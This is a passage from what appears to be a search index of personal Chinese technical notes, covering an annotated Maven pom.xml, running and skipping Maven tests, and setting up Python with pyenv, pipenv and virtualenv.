&lt;!--\u662f\u5426\u4ece\u8be5\u63d2\u4ef6\u4e0b\u8f7dMaven\u6269\u5c55\uff08\u4f8b\u5982\u6253\u5305\u548c\u7c7b\u578b\u5904\u7406\u5668\uff09\uff0c\u7531\u4e8e\u6027\u80fd\u539f\u56e0\uff0c\u53ea\u6709\u5728\u771f\u9700\u8981\u4e0b\u8f7d\u65f6\uff0c\u8be5\u5143\u7d20\u624d\u88ab\u8bbe\u7f6e\u6210enabled\u3002 --&gt;\n        &lt;extensions/&gt;\n        &lt;!--\u5728\u6784\u5efa\u751f\u547d\u5468\u671f\u4e2d\u6267\u884c\u4e00\u7ec4\u76ee\u6807\u7684\u914d\u7f6e\u3002\u6bcf\u4e2a\u76ee\u6807\u53ef\u80fd\u6709\u4e0d\u540c\u7684\u914d\u7f6e\u3002 --&gt;\n        &lt;executions&gt;\n          &lt;!--execution\u5143\u7d20\u5305\u542b\u4e86\u63d2\u4ef6\u6267\u884c\u9700\u8981\u7684\u4fe1\u606f --&gt;\n          &lt;execution&gt;\n            &lt;!--\u6267\u884c\u76ee\u6807\u7684\u6807\u8bc6\u7b26\uff0c\u7528\u4e8e\u6807\u8bc6\u6784\u5efa\u8fc7\u7a0b\u4e2d\u7684\u76ee\u6807\uff0c\u6216\u8005\u5339\u914d\u7ee7\u627f\u8fc7\u7a0b\u4e2d\u9700\u8981\u5408\u5e76\u7684\u6267\u884c\u76ee\u6807 --&gt;\n            &lt;id&gt;default-clean&lt;/id&gt;\n            &lt;!--\u7ed1\u5b9a\u4e86\u76ee\u6807\u7684\u6784\u5efa\u751f\u547d\u5468\u671f\u9636\u6bb5\uff0c\u5982\u679c\u7701\u7565\uff0c\u76ee\u6807\u4f1a\u88ab\u7ed1\u5b9a\u5230\u6e90\u6570\u636e\u91cc\u914d\u7f6e\u7684\u9ed8\u8ba4\u9636\u6bb5 --&gt;\n            &lt;phase&gt;clean&lt;/phase&gt;\n            &lt;!--\u914d\u7f6e\u7684\u6267\u884c\u76ee\u6807 --&gt;\n            &lt;goals&gt;\n              &lt;goal&gt;clean&lt;/goal&gt;\n            &lt;/goals&gt;\n          &lt;/execution&gt;\n        &lt;/executions&gt;\n        &lt;!--\u9879\u76ee\u5f15\u5165\u63d2\u4ef6\u6240\u9700\u8981\u7684\u989d\u5916\u4f9d\u8d56 --&gt;\n        &lt;dependencies&gt;\n          &lt;dependency/&gt;\n        &lt;/dependencies&gt;\n        &lt;!--\u4efb\u4f55\u914d\u7f6e\u662f\u5426\u88ab\u4f20\u64ad\u5230\u5b50\u9879\u76ee --&gt;\n        &lt;inherited/&gt;\n        &lt;!--\u4f5c\u4e3aDOM\u5bf9\u8c61\u7684\u914d\u7f6e --&gt;\n        &lt;configuration&gt;\n          &lt;encoding&gt;UTF-8&lt;/encoding&gt;\n        &lt;/configuration&gt;\n      &lt;/plugin&gt;\n    &lt;/plugins&gt;\n  &lt;/build&gt;\n  &lt;!-- \u6784\u5efaprofile\uff0c\u5982\u679c\u88ab\u6fc0\u6d3b\uff0c\u4f1a\u4fee\u6539\u6784\u5efa\u5904\u7406 --&gt;\n  &lt;profiles/&gt;\n  &lt;!--\u8be5\u5143\u7d20\u63cf\u8ff0\u4e86\u9879\u76ee\u76f8\u5173\u7684\u6240\u6709\u4f9d\u8d56\u3002 \u8fd9\u4e9b\u4f9d\u8d56\u7ec4\u6210\u4e86\u9879\u76ee\u6784\u5efa\u8fc7\u7a0b\u4e2d\u7684\u4e00\u4e2a\u4e2a\u73af\u8282\u3002\u5b83\u4eec\u81ea\u52a8\u4ece\u9879\u76ee\u5b9a\u4e49\u7684\u4ed3\u5e93\u4e2d\u4e0b\u8f7d\u3002\u8981\u83b7\u53d6\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u770b\u9879\u76ee\u4f9d\u8d56\u673a\u5236\u3002 --&gt;\n  &lt;dependencies&gt;\n    &lt;dependency&gt;\n      &lt;groupId&gt;org.apache.maven&lt;/groupId&gt;\n      &lt;artifactId&gt;maven-artifact&lt;/artifactId&gt;\n      &lt;version&gt;3.8.1&lt;/version&gt;\n      &lt;!-- \u4f9d\u8d56\u7c7b\u578b\uff0c\u9ed8\u8ba4\u7c7b\u578b\u662fjar\u3002\u4e00\u4e9b\u7c7b\u578b\u7684\u4f8b\u5b50\uff1ajar\uff0cwar\uff0cejb-client\u548ctest-jar\u3002 --&gt;\n      &lt;type&gt;jar&lt;/type&gt;\n      &lt;!--\u4f9d\u8d56\u8303\u56f4\u3002\u5728\u9879\u76ee\u53d1\u5e03\u8fc7\u7a0b\u4e2d\uff0c\u5e2e\u52a9\u51b3\u5b9a\u54ea\u4e9b\u6784\u4ef6\u88ab\u5305\u62ec\u8fdb\u6765\u3002\u6b32\u77e5\u8be6\u60c5\u8bf7\u53c2\u8003\u4f9d\u8d56\u673a\u5236\u3002\n                - compile \uff1a\u9ed8\u8ba4\u8303\u56f4\uff0c\u7528\u4e8e\u7f16\u8bd1\n                - provided\uff1a\u7c7b\u4f3c\u4e8e\u7f16\u8bd1\uff0c\u4f46\u652f\u6301\u4f60\u671f\u5f85jdk\u6216\u8005\u5bb9\u5668\u63d0\u4f9b\uff0c\u7c7b\u4f3c\u4e8eclasspath\n                - runtime: \u5728\u6267\u884c\u65f6\u9700\u8981\u4f7f\u7528\n                - test: \u7528\u4e8etest\u4efb\u52a1\u65f6\u4f7f\u7528\n                - system: \u9700\u8981\u5916\u5728\u63d0\u4f9b\u76f8\u5e94\u7684\u5143\u7d20\u3002\u901a\u8fc7systemPath\u6765\u53d6\u5f97\n                - systemPath: \u4ec5\u7528\u4e8e\u8303\u56f4\u4e3asystem\u3002\u63d0\u4f9b\u76f8\u5e94\u7684\u8def\u5f84\n                - optional: \u5f53\u9879\u76ee\u81ea\u8eab\u88ab\u4f9d\u8d56\u65f6\uff0c\u6807\u6ce8\u4f9d\u8d56\u662f\u5426\u4f20\u9012\u3002\u7528\u4e8e\u8fde\u7eed\u4f9d\u8d56\u65f6\u4f7f\u7528 --&gt;\n      &lt;scope&gt;test&lt;/scope&gt;\n      &lt;!--\u5f53\u8ba1\u7b97\u4f20\u9012\u4f9d\u8d56\u65f6\uff0c \u4ece\u4f9d\u8d56\u6784\u4ef6\u5217\u8868\u91cc\uff0c\u5217\u51fa\u88ab\u6392\u9664\u7684\u4f9d\u8d56\u6784\u4ef6\u96c6\u3002\u5373\u544a\u8bc9maven\u4f60\u53ea\u4f9d\u8d56\u6307\u5b9a\u7684\u9879\u76ee\uff0c\u4e0d\u4f9d\u8d56\u9879\u76ee\u7684\u4f9d\u8d56\u3002\u6b64\u5143\u7d20\u4e3b\u8981\u7528\u4e8e\u89e3\u51b3\u7248\u672c\u51b2\u7a81\u95ee\u9898 --&gt;\n      &lt;exclusions&gt;\n        &lt;exclusion&gt;\n          &lt;artifactId&gt;spring-core&lt;/artifactId&gt;\n          &lt;groupId&gt;org.springframework&lt;/groupId&gt;\n        &lt;/exclusion&gt;\n      &lt;/exclusions&gt;\n      &lt;!--\u53ef\u9009\u4f9d\u8d56\uff0c\u5982\u679c\u4f60\u5728\u9879\u76eeB\u4e2d\u628aC\u4f9d\u8d56\u58f0\u660e\u4e3a\u53ef\u9009\uff0c\u4f60\u5c31\u9700\u8981\u5728\u4f9d\u8d56\u4e8eB\u7684\u9879\u76ee\uff08\u4f8b\u5982\u9879\u76eeA\uff09\u4e2d\u663e\u5f0f\u7684\u5f15\u7528\u5bf9C\u7684\u4f9d\u8d56\u3002\u53ef\u9009\u4f9d\u8d56\u963b\u65ad\u4f9d\u8d56\u7684\u4f20\u9012\u6027\u3002 --&gt;\n      &lt;optional&gt;true&lt;/optional&gt;\n    &lt;/dependency&gt;\n  &lt;/dependencies&gt;\n  &lt;!--\u8be5\u5143\u7d20\u63cf\u8ff0\u4f7f\u7528\u62a5\u8868\u63d2\u4ef6\u4ea7\u751f\u62a5\u8868\u7684\u89c4\u8303\u3002\u5f53\u7528\u6237\u6267\u884c\"mvn site\"\uff0c\u8fd9\u4e9b\u62a5\u8868\u5c31\u4f1a\u8fd0\u884c\u3002 \u5728\u9875\u9762\u5bfc\u822a\u680f\u80fd\u770b\u5230\u6240\u6709\u62a5\u8868\u7684\u94fe\u63a5\u3002 --&gt;\n  &lt;reporting/&gt;\n  &lt;!-- dependency\u4e2d\u7684\u4f9d\u8d56\u9ed8\u8ba4\u88ab\u5b50\u9879\u76ee\u7ee7\u627f\uff0c\u4f1a\u81ea\u52a8\u5f15\u5165\uff0c\u4f46\u662f\n         dependencyManagement\u4e2d\u7684\u4f9d\u8d56\u5e76\u4e0d\u4f1a\u81ea\u52a8\u5bfc\u5165\uff0c\u4ecd\u65e7\u9700\u8981\u5728\u5b50\u9879\u76ee\u7684pom.xml\u4e2d\u7684dependency\u6807\u7b7e\u4e2d\u58f0\u660e\uff0c\u53ea\u662f\u6b64\u65f6\u53ea\u9700\u8981\u63d0\u4f9b\uff1agroupId\u3001artifactID\u4e24\u4e2a\u4fe1\u606f\u5373\u53ef\u3002--&gt;\n  &lt;dependencyManagement&gt;\n    &lt;dependencies&gt;\n      &lt;dependency&gt;\n        &lt;groupId&gt;org.slf4j&lt;/groupId&gt;\n        &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt;\n        &lt;version&gt;${slf4j.version}&lt;/version&gt;\n      &lt;/dependency&gt;\n      &lt;dependency&gt;\n        &lt;groupId&gt;org.slf4j&lt;/groupId&gt;\n        &lt;artifactId&gt;jul-to-slf4j&lt;/artifactId&gt;\n        &lt;version&gt;${slf4j.version}&lt;/version&gt;\n      &lt;/dependency&gt;\n    &lt;/dependencies&gt;\n  &lt;/dependencyManagement&gt;\n  &lt;!-- \u6807\u7b7e\u5185\u58f0\u660e\u53d8\u91cf\uff0c\u5728\u6574\u4e2apom.xml\u4e2d\u53ef\u90fd\u4ee5\u4f7f\u7528\u8be5\u53d8\u91cf --&gt;\n  &lt;properties&gt;\n    &lt;slf4j.version&gt;1.7.5&lt;/slf4j.version&gt;\n  &lt;/properties&gt;\n  &lt;!--\u9879\u76ee\u5206\u53d1\u4fe1\u606f\uff0c\u5728\u6267\u884c\"mvn deploy\"\u540e\u8868\u793a\u8981\u53d1\u5e03\u7684\u4f4d\u7f6e\u3002\u6709\u4e86\u8fd9\u4e9b\u4fe1\u606f\u5c31\u53ef\u4ee5\u628a\u7f51\u7ad9\u90e8\u7f72\u5230\u8fdc\u7a0b\u670d\u52a1\u5668\u6216\u8005\u628a\u6784\u4ef6\u90e8\u7f72\u5230\u8fdc\u7a0b\u4ed3\u5e93\u3002 --&gt;\n  &lt;distributionManagement&gt;\n    &lt;repository&gt;\n      &lt;id&gt;internal-repo&lt;/id&gt;\n      &lt;name&gt;Temporary Staging Repository&lt;/name&gt;\n      &lt;url&gt;file://${project.build.directory}/mvn-repo/releases&lt;/url&gt;\n    &lt;/repository&gt;\n    &lt;snapshotRepository&gt;\n      &lt;id&gt;internal-snapshot-repo&lt;/id&gt;\n      &lt;name&gt;Temporary Staging Snapshot Repository&lt;/name&gt;\n      &lt;url&gt;file://${project.build.directory}/mvn-repo/snapshots&lt;/url&gt;\n    &lt;/snapshotRepository&gt;\n    &lt;!-- \u82e5\u53ea\u90e8\u7f72\u672c\u5730\uff0c\u5219\u4e0b\u9762\u7684\u914d\u7f6e\u90fd\u4e0d\u9700\u8981\uff01 --&gt;\n    &lt;!--\u90e8\u7f72\u9879\u76ee\u7684\u7f51\u7ad9\u9700\u8981\u7684\u4fe1\u606f--&gt;\n    &lt;site&gt;\n      &lt;!--\u90e8\u7f72\u4f4d\u7f6e\u7684\u552f\u4e00\u6807\u8bc6\u7b26\uff0c\u7528\u6765\u5339\u914d\u7ad9\u70b9\u548csettings.xml\u6587\u4ef6\u91cc\u7684\u914d\u7f6e --&gt;\n      &lt;id&gt;banseon-site&lt;/id&gt;\n      &lt;!--\u90e8\u7f72\u4f4d\u7f6e\u7684\u540d\u79f0 --&gt;\n      &lt;name&gt;business api website&lt;/name&gt;\n      &lt;!--\u90e8\u7f72\u4f4d\u7f6e\u7684URL\uff0c\u6309protocol://hostname/path\u5f62\u5f0f --&gt;\n      &lt;url&gt;scp://svn.baidu.com/banseon:/var/www/localhost/banseon-web&lt;/url&gt;\n    &lt;/site&gt;\n  &lt;/distributionManagement&gt;\n&lt;/project&gt;\n</code></pre>"},{"location":"language/java/maven/#maven_5","title":"Maven \u5b9e\u8df5","text":""},{"location":"language/java/maven/#_9","title":"\u5355\u5143\u6d4b\u8bd5","text":"<p>Maven \u672c\u8eab\u6ca1\u6709\u5355\u5143\u6d4b\u8bd5\u6846\u67b6\uff0c\u5176 default \u751f\u547d\u5468\u671f\u7684 test \u9636\u6bb5\u7ed1\u5b9a\u4e86 maven-surefire-plugin \u63d2\u4ef6\uff0c\u8be5\u63d2\u4ef6\u53ef\u4ee5\u8c03\u7528 Junit3\u3001Junit4\u3001TestNG \u7b49 Java \u6d41\u884c\u6d4b\u8bd5\u6846\u67b6\u5b8c\u6210\u5355\u5143\u6d4b\u8bd5\u3002</p> <p>\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cmaven-surefire-plugin \u7684 test \u76ee\u6807\u4f1a\u81ea\u52a8\u6267\u884c\u6d4b\u8bd5\u6e90\u7801\u8def\u5f84\uff08\u9ed8\u8ba4\u4e3a src/test/java/\uff09\u4e0b\u6240\u6709\u7b26\u5408\u4e00\u7ec4\u547d\u540d\u6a21\u5f0f\u7684\u6d4b\u8bd5\u7c7b\u3002\u8fd9\u7ec4\u6a21\u5f0f\u4e3a\uff1a</p> <ul> <li><code>*/Test*.java</code>\uff1a\u4efb\u4f55\u5b50\u76ee\u5f55\u4e0b\u6240\u6709\u547d\u540d\u4ee5 Test \u5f00\u5934\u7684 Java \u7c7b\u3002</li> <li><code>*/*Test.java</code>\uff1a\u4efb\u4f55\u5b50\u76ee\u5f55\u4e0b\u6240\u6709\u547d\u540d\u4ee5 Test \u7ed3\u5c3e\u7684 Java \u7c7b\u3002</li> <li><code>*/*TestCase.java</code>\uff1a\u4efb\u4f55\u5b50\u76ee\u5f55\u4e0b\u6240\u6709\u547d\u540d\u4ee5 TestCase \u7ed3\u5c3e\u7684 Java \u7c7b\u3002</li> </ul>"},{"location":"language/java/maven/#3","title":"3 \u8df3\u8fc7\u6d4b\u8bd5","text":"<p>1. \u8981\u8df3\u8fc7\u6d4b\u8bd5\uff0c\u5728 package \u65f6\u52a0\u5165\u53c2\u6570 <code>skipTests</code> \u5373\u53ef</p> <pre><code>mvn package -DskipTests\n</code></pre> <p>2. \u6709\u65f6\u4e0d\u4ec5\u9700\u8981\u8df3\u8fc7\u6d4b\u8bd5\u8fd0\u884c\uff0c\u8fd8\u8981\u8df3\u8fc7\u6d4b\u8bd5\u4ee3\u7801\u7684\u7f16\u8bd1\uff1a</p> <pre><code>mvn package -Dmaven.test.skip=true\n</code></pre> <p>3. \u4e0a\u8ff0\u4e8c\u8005\u90fd\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e <code>pom.xml \u2192 build \u2192 plugin</code>\u5b9e\u73b0</p> <pre><code>&lt;plugin&gt;\n    &lt;groupId&gt;org.apache.maven.plugin&lt;/groupId&gt;\n    &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;\n    &lt;configuration&gt;\n        &lt;skip&gt;true&lt;/skip&gt;\n    &lt;/configuration&gt;\n&lt;/plugin&gt;\n&lt;plugin&gt;\n    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n    &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;\n    &lt;configuration&gt;\n        &lt;skip&gt;true&lt;/skip&gt;\n    &lt;/configuration&gt;\n&lt;/plugin&gt;\n</code></pre>"},{"location":"language/java/maven/#_10","title":"\u52a8\u6001\u6307\u5b9a\u8981\u8fd0\u884c\u7684\u6d4b\u8bd5\u7528\u4f8b","text":"<p>maven-surefire-plugin \u63d0\u4f9b\u4e86\u4e00\u4e2a test \u53c2\u6570\u8ba9 Maven \u7528\u6237\u80fd\u591f\u5728\u547d\u4ee4\u884c\u6307\u5b9a\u8981\u8fd0\u884c\u7684\u6d4b\u8bd5\u7528\u4f8b\u3002\u5982\uff1a</p> <pre><code>mvn test -Dtest=RandomGeneratorTest\n# \u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26\n# \u9017\u53f7\u5206\u9694\u591a\u4e2a\u6d4b\u8bd5\u7528\u4f8b\nmvn test -Dtest=Random*Test,AccountCaptchaServiceTest\n</code></pre>"},{"location":"language/java/multi-thread/","title":"\u591a\u7ebf\u7a0b","text":"<p>TODO\uff1a\u7ed3\u5408 Notion \u7b14\u8bb0\u548c POST \u7b14\u8bb0\uff0cNotion \u4e2d\u5e94\u8be5\u66f4\u65b0\u4e00\u70b9\uff01</p>"},{"location":"language/python/install/","title":"Python Install","text":"<p>\u4e3b\u8981\u5b89\u88c5\u4e24\u4e2a\u4e1c\u2ec4</p> <ul> <li>Python \u5305\u7ba1\u7406\u5668\uff1aPipenv\u3001virtualenv\u3002\u4e24\u8005\u53ef\u4e92\u4e3a\u66ff\u4ee3\uff0c\u540e\u8005\u66f4\u4f4e\u5c42\u6b21</li> <li>Python \u7248\u672c\u7ba1\u7406\u5668\uff1aPyenv</li> </ul> <p>\u9996\u5148\u5b89\u88c5 pyenv\uff0c\u5b89\u88c5\u67d0\u4e2a\u7248\u672c\u7684 Python\uff0c\u5c06\u5176\u4f5c\u4e3a <code>\u5168\u5c40 Python</code>\uff0c\u968f\u540e\u5b89\u88c5 pipenv\uff0c\u7528\u4e8e\u7ba1\u7406\u5355\u4e2a\u9879\u76ee\u7684 <code>Python \u5305</code></p>"},{"location":"language/python/install/#pyenv","title":"\u4e00\u3001\u7248\u672c\u7ba1\u7406\u5668\uff1aPyenv","text":""},{"location":"language/python/install/#11-pyenv","title":"1.1 \u5b89\u88c5 Pyenv","text":"mac<pre><code>brew update\nbrew install pyenv\nbrew install openssl readline sqlite3 xz zlib\necho 'eval \"$(pyenv init --path)\"' &gt;&gt; ~/.zprofile\necho 'eval \"$(pyenv init -)\"' &gt;&gt; ~/.zshrc\n</code></pre> ubuntu<pre><code>git clone https://github.com/pyenv/pyenv.git ~/.pyenv\n\necho 'export PYENV_ROOT=\"$HOME/.pyenv\"' &gt;&gt; ~/.zshrc\necho 'command -v pyenv &gt;/dev/null || export PATH=\"$PYENV_ROOT/bin:$PATH\"' &gt;&gt; ~/.zshrc\necho 'eval \"$(pyenv init -)\"' &gt;&gt; ~/.zshrc\n</code></pre> <p>Note</p> <p>\u82e5\u56fd\u5185\u7f51\u7edc\u4e0d\u597d\uff0c\u53ef\u4f7f\u7528 gitee \u955c\u50cf\uff1a<code>git@gitee.com:chenshuchuan/pyenv.git</code></p>"},{"location":"language/python/install/#12-pyenv-python","title":"1.2 \u4f7f\u7528 Pyenv \u5b89\u88c5 Python","text":"<pre><code># ubuntu\u9700\u8981\u5b89\u88c5\u7f16\u8bd1\u73af\u5883\nsudo apt-get install -y make build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev xz-utils tk-dev liblzma-dev\n\n# m1 \u5b89\u88c53.9.4\uff0c\u5173\u95edvpn\npyenv install 3.8.0\npyenv versions # \u67e5\u770b\u6240\u6709\u5b89\u88c5\u7684Python\n</code></pre>"},{"location":"language/python/install/#13-pyenv","title":"1.3 \u66f4\u6362 Pyenv \u6dd8\u5b9d\u6e90","text":"<p>pyenv \u82e5\u51fa\u73b0\u5b89\u88c5\u6162\u7684\u60c5\u51b5\uff0c\u63a8\u8350\u4f7f\u7528\u6dd8\u5b9d\u6e90\u5b89\u88c5\uff1a</p> \u5c06\u4ee3\u7801\u5199\u5165 .zshrc \u4e2d<pre><code>function pyinstall() {\n    v=$1\n    echo \u51c6\u5907\u4f7f\u7528\u6dd8\u5b9d\u6e90\u5b89\u88c5 Python $v\n    curl -L https://npm.taobao.org/mirrors/python/$v/Python-$v.tar.xz -o ~/.pyenv/cache/Python-$v.tar.xz\n    pyenv install $v\n}\n</code></pre> \u6dd8\u5b9d\u6e90\u5b89\u88c5\uff0c\u5e76\u8bbe\u7f6e Python \u7248\u672c<pre><code>pyinstall 3.8.0\npyenv global 3.8.0  # \u8bbe\u7f6e\u5168\u5c40\u7684 Python \u7248\u672c\uff0c\u901a\u8fc7\u5c06\u7248\u672c\u53f7\u5199\u5165 ~/.pyenv/version \u6587\u4ef6\u7684\u65b9\u5f0f\u3002\npyenv local 3.8.0 # \u8bbe\u7f6e Python \u672c\u5730\u7248\u672c\uff0c\u901a\u8fc7\u5c06\u7248\u672c\u53f7\u5199\u5165\u5f53\u524d\u76ee\u5f55\u4e0b\u7684 .python-version \u6587\u4ef6\u7684\u65b9\u5f0f\u3002\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u8bbe\u7f6e\u7684 Python \u7248\u672c\u4f18\u5148\u7ea7\u8f83 global \u9ad8\u3002\n</code></pre>"},{"location":"language/python/install/#_1","title":"\u4e8c\u3001\u5305\u7ba1\u7406\u5668","text":""},{"location":"language/python/install/#pipenv","title":"Pipenv","text":"install<pre><code>pip install --user pipenv\n\n# \u5982\u679c\u65e0\u6cd5\u4f7f\u7528\uff0c\u6dfb\u52a0\u4e0b\u8ff0\u81f3.zshrc\nexport PATH=\"$PATH:$HOME/.local/bin\"\n</code></pre> usage<pre><code># \u8fdb\u5165\u9879\u76ee\u76ee\u5f55\ncd my_project_folder\n\n# \u521d\u59cb\u5316\npipenv install\n\n# \u8fdb\u5165\u865a\u62df\u73af\u5883\npipenv shell\n\n# \u5b89\u88c5\u4f9d\u8d56\uff08\u5728\u5f53\u524d\u9879\u76ee\u76ee\u5f55\u4e0b\u5373\u53ef\uff0c\u4e0d\u8fdb\u5165pipenv shell\u4e5f\u53ef\u4ee5\u7684\uff09\npipenv install requests\n</code></pre> <p>Pipenv \u5c06\u5728\u60a8\u7684\u9879\u76ee\u76ee\u5f55\u4e2d\u5b89\u88c5\u8d85\u8d5e\u7684 \u00a0Requests\u00a0 \u5e93\u5e76\u4e3a\u60a8\u521b\u5efa\u4e00\u4e2a \u00a0Pipfile\u3002</p> <p><code>Pipfile</code>\u00a0 \u7528\u4e8e\u8ddf\u8e2a\u60a8\u7684\u9879\u76ee\u4e2d\u9700\u8981\u91cd\u65b0\u5b89\u88c5\u7684\u4f9d\u8d56\uff0c\u4f8b\u5982\u5728\u4e0e\u4ed6\u4eba\u5171\u4eab\u9879\u76ee\u65f6\u3002</p> <p>Note</p> <p>\u5982\u679c\u56fd\u5185\u7f51\u7edc\u4e0d\u597d\uff0c \u63a8\u8350\u66f4\u6362\u4e3a\u963f\u91cc\u6e90\uff1a</p> <ul> <li>\u6253\u5f00 <code>Pipfile</code> \u6587\u4ef6</li> <li>\u4fee\u6539\u4e3a\uff1a<code>http://mirrors.aliyun.com/pypi/simple/</code></li> </ul> <p>\u73b0\u5728\u5b89\u88c5\u4e86 Requests\uff0c\u60a8\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u7b80\u5355\u7684 \u00a0<code>main.py</code>\u00a0 \u6587\u4ef6\u6765\u4f7f\u7528\u5b83\uff1a</p> <pre><code>import requests\n\nresponse = requests.get('https://httpbin.org/ip')\n\nprint('Your IP is {0}'.format(response.json()['origin']))\n</code></pre> <p>\u7136\u540e\u60a8\u5c31\u53ef\u4ee5\u4f7f\u7528 \u00a0<code>pipenv\u00a0run</code>\u00a0 \u8fd0\u884c\u8fd9\u6bb5\u811a\u672c\uff1a</p> <pre><code>pipenv run python main.py\n</code></pre> <pre><code># Remove the virtualenv.\npipenv --rm\n</code></pre>"},{"location":"language/python/install/#virtualenv","title":"virtualenv","text":"install<pre><code># \u4f7f\u7528pip\u5b89\u88c5\u7684\u662fpython2\npip3 install virtualenv\n# \u5982\u679c\u65e0\u6cd5\u4f7f\u7528\uff0c\u5c06\u4e0b\u8ff0\u6587\u4ef6\u6dfb\u52a0\u5230.zshrc reference from(https://stackoverflow.com/questions/31133050/virtualenv-command-not-found)\nPATH=\"$PATH:$HOME/.local/bin\"\n</code></pre> step1: \u4e3a\u5de5\u7a0b\u521b\u5efa\u4e00\u4e2a\u865a\u62df\u73af\u5883<pre><code>cd my_project_folder\nvirtualenv venv\npython -m virtualenv env  # \u4f7f\u7528\u5f53\u524dpython\u751f\u6210\u865a\u62df\u73af\u5883\n</code></pre> <p><code>virtualenv\u00a0venv</code>\u00a0 \u5c06\u4f1a\u5728\u5f53\u524d\u7684\u76ee\u5f55\u4e2d\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u5305\u542b\u4e86 Python \u53ef\u6267\u884c\u6587\u4ef6\uff0c \u4ee5\u53ca \u00a0<code>pip</code>\u00a0 \u5e93\u7684\u4e00\u4efd\u62f7\u8d1d\uff0c\u8fd9\u6837\u5c31\u80fd\u5b89\u88c5\u5176\u4ed6\u5305\u4e86\u3002</p> <p>\u865a\u62df\u73af\u5883\u7684\u540d\u5b57\uff08\u6b64\u4f8b\u4e2d\u662f \u00a0<code>venv</code>\u00a0\uff09 \u53ef\u4ee5\u662f\u4efb\u610f\u7684\uff1b\u82e5\u7701\u7565\u540d\u5b57\u5c06\u4f1a\u628a\u6587\u4ef6\u5747\u653e\u5728\u5f53\u524d\u76ee\u5f55\u3002</p> step2\uff1a\u6fc0\u6d3b\u865a\u62df\u73af\u5883<pre><code>source venv/bin/activate\n</code></pre> <p>\u5f53\u524d\u865a\u62df\u73af\u5883\u7684\u540d\u5b57\u4f1a\u663e\u793a\u5728\u63d0\u793a\u7b26\u5de6\u4fa7\uff08\u6bd4\u5982\u8bf4 \u00a0<code>(venv)\u60a8\u7684\u7535\u8111:\u60a8\u7684\u5de5\u7a0b\u00a0\u7528\u6237\u540d$</code>\uff09\u00a0\u4ee5\u8ba9\u60a8\u77e5\u9053\u5b83\u662f\u6fc0\u6d3b\u7684\u3002</p> <p>\u4ece\u73b0\u5728\u8d77\uff0c\u4efb\u4f55\u60a8\u4f7f\u7528pip\u5b89\u88c5\u7684\u5305\u5c06\u4f1a\u653e\u5728 <code>venv</code>\u00a0 \u6587\u4ef6\u5939\u4e2d\uff0c \u4e0e\u5168\u5c40\u5b89\u88c5\u7684 Python \u9694\u7edd\u5f00\u3002</p> step3\uff1a\u5b89\u88c5\u5305<pre><code>pip install requests\n</code></pre> <p>\u5982\u679c\u60f3\u5728 vscode \u4e2d\u4f7f\u7528\uff0c <code>command shift p</code>\u8f93\u5165 <code>Python: Select Interpreter</code>\uff0c\u9009\u62e9 <code>venv/bin/python3.6</code>\uff0c\u7136\u540e\u518d\u6b21<code>command shift p</code>\u8f93\u5165 <code>Python: Create Terminal</code>\uff0c\u65b0\u5efa\u7ec8\u7aef\u65f6\uff0c\u4f1a\u9ed8\u8ba4\u81ea\u52a8\u8c03\u7528\u4e0a\u8ff0\u7684 <code>source venv/bin/activate</code>\u7684\u547d\u4ee4\u3002</p> step4\uff1a\u5b8c\u6210\u5de5\u4f5c\uff0c\u505c\u7528\u865a\u62df\u73af\u5883<pre><code>deactivate\n</code></pre> <p>\u8fd9\u5c06\u4f1a\u56de\u5230\u7cfb\u7edf\u9ed8\u8ba4\u7684 Python \u89e3\u91ca\u5668\uff0c\u5305\u62ec\u5df2\u5b89\u88c5\u7684\u5e93\u4e5f\u4f1a\u56de\u5230\u9ed8\u8ba4\u7684\u3002</p> <p>\u8981\u5220\u9664\u4e00\u4e2a\u865a\u62df\u73af\u5883\uff0c\u53ea\u9700\u5220\u9664\u5b83\u7684\u6587\u4ef6\u5939\uff0c\u6216\u8005\u6267\u884c <code>rm\u00a0-rf\u00a0venv</code>\u3002</p>"},{"location":"language/python/install/#requirementstxt","title":"\u4e09\u3001requirements.txt","text":"<p>\u60f3\u8981\u5c06\u5f53\u524d pip list \u7684\u5185\u5bb9\u751f\u6210 <code>requirements.txt</code> \uff0c\u53ef\u4ee5\u4f7f\u7528\uff1a</p> <pre><code>pip freeze &gt; requirements.txt\n</code></pre>"},{"location":"language/python/install/#_2","title":"\u56db\u3001\u603b\u7ed3","text":"<p>\u5305\u7ba1\u7406\u5668\uff1a\u5728 pycharm \u4e2d\u4f7f\u7528\u9ed8\u8ba4\u7684 virtualenv\uff0c\u5728 vscode \u4e2d\u4f7f\u7528 Pipenv</p> <p>\u7248\u672c\u7ba1\u7406\u5668\uff1apyenv\uff0c\u4f46\u662f\u5728\u5b9e\u9645\u9879\u76ee\u4e2d\uff0c\u548c\u5b83\u65e0\u5173\uff01</p> <p>\u6ce8\u610f\uff0c\u65e0\u8bba\u662f\u4f7f\u7528 virtualenv \u8fd8\u662f pipenv \u521b\u5efa\u7684\u865a\u62df\u73af\u5883\uff0c\u5728\u865a\u62df\u73af\u5883\u7684\u6587\u4ef6\u5939\u4e0b\u7684 bin \u76ee\u5f55\u4e2d\uff0c\u90fd\u5b58\u5728\u5bf9\u5e94\u7684 python interpreter\uff0c\u4e5f\u5c31\u662f python \u89e3\u91ca\u5668\u3002</p> <p>\u5728\u5b9e\u9645\u9879\u76ee\u5185\uff0c\u5fc5\u987b\u4f7f\u7528\u865a\u62df\u73af\u5883\u7684\u89e3\u91ca\u5668\uff0c\u800c\u4e0d\u662f pyenv \u7684\u89e3\u91ca\u5668\uff01</p>"},{"location":"language/python/install/#vscode-pipenv","title":"\u4e94\u3001vscode \u4e3a\u4f8b\u8bb2\u89e3 pipenv","text":"<p>\u8fdb\u5165\u9879\u76ee\u76ee\u5f55\uff0c\u4f7f\u7528 <code>pipenv install</code> \u521b\u5efa\u597d\u865a\u62df\u73af\u5883\u3002</p> <p><code>command shift p</code> 